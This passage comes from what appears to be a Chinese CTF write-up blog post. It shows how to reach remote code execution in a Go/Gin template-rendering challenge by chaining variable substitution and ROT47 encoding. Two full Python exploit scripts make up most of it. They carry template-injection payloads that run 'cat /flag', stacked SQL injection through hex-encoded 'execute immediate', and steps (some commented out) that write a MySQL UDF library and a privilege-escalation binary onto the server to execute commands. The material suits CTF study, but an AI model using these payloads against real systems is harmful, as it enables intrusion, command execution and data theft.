+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\func(%<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line">  Your number today:</span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\ draw_number(%name%); /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样，我们就能将 <code>&lt;/b&gt;&lt;/h1&gt;&lt;p class=&quot;number&quot;&gt; Your number today: &lt;b&gt;&lt;\ draw_number(%name</code> 一整串内容作为变量名（当然，这里的前提是模板支持这种做法，而这里使用的 go web 框架 Gin 时默认支持的）</p>
+<p>我们将其替换得到</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\func(&#x27;arg&#x27;); /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>也就是说，我们要让 <code>&lt;\ %name% /&gt;</code> 渲染为 <code>&lt;\func(</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;\func(%</span><br><span class="line">&#x27;&lt;&lt;\\func(%&#x27;</span><br><span class="line">&#x27;&lt;&lt;&#x27;&#x27;\\func(%&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&lt;&lt;&#x27;%var1%&#x27;&#x27; var1=\\func(%</span><br><span class="line">&#x27;&lt;&lt;%var2%&#x27;   var2=%var1%</span><br><span class="line">%name%       name=&lt;&lt;%var2%</span><br></pre></td></tr></table></figure>
+<p>这样就能执行任意函数了：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://web-482826a227.adworld.xctf.org.cn/&quot;</span></span><br><span class="line">CALC_URL = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>calc&quot;</span></span><br><span class="line">DRAW_URL = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>draw&quot;</span></span><br><span class="line">SO_PATH = <span class="string">&quot;lib_mysqludf_sys_64.so&quot;</span></span><br><span class="line">REMOTE_SO = <span class="string">&quot;/usr/lib/mysql/plugin/udf64.so&quot;</span></span><br><span class="line"></span><br><span class="line">CF_PATH = <span class="string">&quot;copy_fail_exp_splice&quot;</span></span><br><span class="line">REMOTE_CF = <span class="string">&quot;/tmp/cf3&quot;</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;base64 /usr/local/bin/41323461_myapp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_bytes</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(data).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_sql</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sql.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_upload_payload</span>(<span class="params">so_path: <span class="built_in">str</span>, remote_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    so_bytes = pathlib.Path(so_path).read_bytes()</span><br><span class="line">    so_hex = to_hex_bytes(so_bytes)</span><br><span class="line">    inner_sql = <span class="string">f&quot;select 0x<span class="subst">&#123;so_hex&#125;</span> into dumpfile &#x27;<span class="subst">&#123;remote_path&#125;</span>&#x27;&quot;</span></span><br><span class="line">    inner_sql_hex = to_hex_sql(inner_sql)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;1;execute immediate 0x<span class="subst">&#123;inner_sql_hex&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>(<span class="params">expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr_hex = to_hex_sql(expr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;1;execute immediate 0x<span class="subst">&#123;expr_hex&#125;</span>#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_expr</span>(<span class="params">url: <span class="built_in">str</span>, expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;expression&quot;</span>: expr&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_eval</span>(<span class="params">url:<span class="built_in">str</span>, command: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr = <span class="string">f&quot;select sys_eval(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    r = post_expr(url, build_payload(expr))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_decode</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;**\[**(\d+(?:\s+\d+)*)**\]**&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    numbers_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    ascii_codes = [<span class="built_in">int</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> numbers_str.split()]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ascii_codes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_file</span>(<span class="params">url:<span class="built_in">str</span> ,path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr = <span class="string">f&quot;load_file(&#x27;<span class="subst">&#123;path&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    r = post_expr(url, build_payload(expr))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_to_file</span>(<span class="params">b64_string: <span class="built_in">str</span>, output_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(b64_string))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw2rce</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    arg = <span class="string">&quot;123&quot;</span></span><br><span class="line">    <span class="built_in">vars</span> = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&lt;&lt;%var2%&quot;</span>,</span><br><span class="line">        <span class="string">&quot;var1&quot;</span>: <span class="string">&quot;\\\\draw_number(%&quot;</span>,</span><br><span class="line">        <span class="string">&quot;var2&quot;</span>: <span class="string">&quot;%var1%&quot;</span>,</span><br><span class="line">        <span class="string">&#x27; &lt;/b&gt;&lt;/h1&gt;\n    &lt;p class=&quot;number&quot;&gt;Your number today: &lt;b&gt;&lt;\\ draw_number(%name&#x27;</span>: arg,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=<span class="built_in">vars</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># payload = build_upload_payload(SO_PATH, REMOTE_SO)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = build_payload(&quot;create function sys_eval returns string soname &#x27;udf64.so&#x27;#&quot;)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = build_upload_payload(CF_PATH, REMOTE_CF)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># base64_to_file(extract_and_decode(execute_eval(CALC_URL, command)), &quot;myapp&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(draw2rce(DRAW_URL))</span><br></pre></td></tr></table></figure>
+<p>那么如何引入 run 函数所需的 unsafe 呢？</p>
+<p>我们注意到一个函数 <code>strrot()</code>，是一个 rot 函数，测试一下具体功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strrot(&#x27;123456abcdefg&#x27;)</span><br><span class="line">`abcde2345678</span><br></pre></td></tr></table></figure>
+<p>符合 ROT47 特征，可以利用来引入任意模板执行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;\strrot(%arg%); /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">&lt;\strrot(&#x27;payload&#x27;);/&gt;</span><br><span class="line">&lt;\&#x27;rot_payload&#x27;/&gt;</span><br></pre></td></tr></table></figure>
+<p>我们最终的构造目标是 <code>&lt;\ run(&quot;id&quot;);unsafe /&gt;</code>，这里分号是不能引入变量中的，因此整个 run 命令必须塞入 <code>strrot</code> 函数内，那么闭合单引号就是主要需要解决的问题</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\<span class="string">&#x27;rot_payload&#x27;</span>/&gt;</span><br><span class="line">&lt;\<span class="string">&#x27;/&gt;&lt;\ run(&#x27;</span>id<span class="string">&#x27;);unsafe /&gt;&#x27;</span>/&gt;</span><br></pre></td></tr></table></figure>
+<p>边界符匹配是懒惰的，因此这个地方在下一轮渲染时会优先把前面的无用模板匹配掉</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;\ run(<span class="string">&#x27;id&#x27;</span>);unsafe /&gt;<span class="string">&#x27;/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时再次匹配就会匹配到 run 函数，于是 rce 达成</p>
+<p><img src="ACTF2026.assets/3594534-20260522110713823-1801094566.png" alt="img" /></p>
+<h4 id="最终exp"><a class="markdownIt-Anchor" href="#最终exp"></a> 最终exp</h4>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://web-482826a227.adworld.xctf.org.cn/&quot;</span></span><br><span class="line">CALC_URL = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>calc&quot;</span></span><br><span class="line">DRAW_URL = <span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>draw&quot;</span></span><br><span class="line">SO_PATH = <span class="string">&quot;lib_mysqludf_sys_64.so&quot;</span></span><br><span class="line">REMOTE_SO = <span class="string">&quot;/usr/lib/mysql/plugin/udf64.so&quot;</span></span><br><span class="line"></span><br><span class="line">CF_PATH = <span class="string">&quot;copy_fail_exp_splice&quot;</span></span><br><span class="line">REMOTE_CF = <span class="string">&quot;/tmp/cf3&quot;</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;base64 /usr/local/bin/41323461_myapp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_bytes</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(data).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_sql</span>(<span class="params">sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sql.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_upload_payload</span>(<span class="params">so_path: <span class="built_in">str</span>, remote_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    so_bytes = pathlib.Path(so_path).read_bytes()</span><br><span class="line">    so_hex = to_hex_bytes(so_bytes)</span><br><span class="line">    inner_sql = <span class="string">f&quot;select 0x<span class="subst">&#123;so_hex&#125;</span> into dumpfile &#x27;<span class="subst">&#123;remote_path&#125;</span>&#x27;&quot;</span></span><br><span class="line">    inner_sql_hex = to_hex_sql(inner_sql)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;1;execute immediate 0x<span class="subst">&#123;inner_sql_hex&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>(<span class="params">expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr_hex = to_hex_sql(expr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;1;execute immediate 0x<span class="subst">&#123;expr_hex&#125;</span>#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_expr</span>(<span class="params">url: <span class="built_in">str</span>, expr: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;expression&quot;</span>: expr&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_eval</span>(<span class="params">url:<span class="built_in">str</span>, command: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr = <span class="string">f&quot;select sys_eval(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    r = post_expr(url, build_payload(expr))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_decode</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;**\[**(\d+(?:\s+\d+)*)**\]**&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    numbers_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    ascii_codes = [<span class="built_in">int</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> numbers_str.split()]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ascii_codes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_file</span>(<span class="params">url:<span class="built_in">str</span> ,path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    expr = <span class="string">f&quot;load_file(&#x27;<span class="subst">&#123;path&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    r = post_expr(url, build_payload(expr))</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_to_file</span>(<span class="params">b64_string: <span class="built_in">str</span>, output_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(b64_string))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot47</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        code = <span class="built_in">ord</span>(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= code &lt;= <span class="number">126</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>(<span class="number">33</span> + ((code - <span class="number">33</span> + <span class="number">47</span>) % <span class="number">94</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw2rce</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    func = <span class="string">&quot;strrot&quot;</span></span><br><span class="line">    arg = rot47(<span class="string">r&quot;/&gt;&lt;**\ **run(&#x27;cat /flag&#x27;);unsafe /&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">vars</span> = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&lt;&lt;%var2%&quot;</span>,</span><br><span class="line">        <span class="string">&quot;var1&quot;</span>: <span class="string">f&quot;\\\\<span class="subst">&#123;func&#125;</span>(%&quot;</span>,</span><br><span class="line">        <span class="string">&quot;var2&quot;</span>: <span class="string">&quot;%var1%&quot;</span>,</span><br><span class="line">        <span class="string">&#x27; &lt;/b&gt;&lt;/h1&gt;\n    &lt;p class=&quot;number&quot;&gt;Your number today: &lt;b&gt;&lt;\\ draw_number(%name&#x27;</span>: arg,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=<span class="built_in">vars</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># payload = build_upload_payload(SO_PATH, REMOTE_SO)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = build_payload(&quot;create function sys_eval returns string soname &#x27;udf64.so&#x27;#&quot;)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = build_upload_payload(CF_PATH, REMOTE_CF)</span></span><br><span class="line">    <span class="comment"># print(f&quot;payload length: &#123;len(payload)&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># html = post_expr(CALC_URL, payload)</span></span><br><span class="line">    <span class="comment"># print(html[:2000])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># base64_to_file(extract_and_decode(execute_eval(CALC_URL, command)), &quot;myapp&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(draw2rce(DRAW_URL))</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="DASCTF2026夏季赛" class="lazyload">
+          
+        
+        <a href="/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            DASCTF2026夏季赛
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/background-2.jpg" data-sizes="auto" alt="LitCTF2026" class="lazyload">
+        
+      
+      <a href="/2026/05/25/LitCTF2026/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          LitCTF2026
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
